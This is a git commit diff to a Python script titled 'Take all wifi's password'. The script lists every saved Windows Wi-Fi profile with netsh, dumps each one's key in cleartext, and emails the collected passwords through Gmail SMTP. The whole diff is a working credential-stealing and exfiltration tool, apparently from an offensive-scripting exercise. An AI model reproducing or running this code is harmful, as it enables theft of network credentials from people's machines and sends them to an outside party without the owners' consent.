65b84c4ae37fc9289a0541e118fbcc33a650397d
developerkhashab <mohammad.khashab.mk@gmail.com>
2020-08-22 10:20:54 -0400

    Take all wifi's password

--- Execute_command/execute_command.py
+++ Execute_command/execute_command.py
@@ -6,20 +6,22 @@ import re
 
 
 def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 465)
-    server.ehlo()
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
     server.login(email, password)
     server.sendmail(email, email, message)
     server.quit()
 
 
-command = "netsh wlan show profile MYWIFI key=clear"
+command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
-network_names_list = re.findall("(?:Profile\s*:\s)(.*)")
+network_names_list =  re.findall("(?:Profile\s*:\s)(.*?)(?:\\r)", networks.decode("utf-8"))
 
 result = ""
+
 for network_name in network_names_list:
-    command = "netsh wlan show profile " + network_name + " key=clear"
+    command = command = 'netsh wlan show profile \"' + str(network_name).strip() + '\" key=clear'
     current_result = subprocess.check_output(command, shell=True)
-    result = result + current_result
-send_mail("myemail@myemail.com", "mypassword", result)
+    result = result +'\n'+ str(current_result)
+print(result)
+send_mail("myemail@myemail.com","mypassword",result)
